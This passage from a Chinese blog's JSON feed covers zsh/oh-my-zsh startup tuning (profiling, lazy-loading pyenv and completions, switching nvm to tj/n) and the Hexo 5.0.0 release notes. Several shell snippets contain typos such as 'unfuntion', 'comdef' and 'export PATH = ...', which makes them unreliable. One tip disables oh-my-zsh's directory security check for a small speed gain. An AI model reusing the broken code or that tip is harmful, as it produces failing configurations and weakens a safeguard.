class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]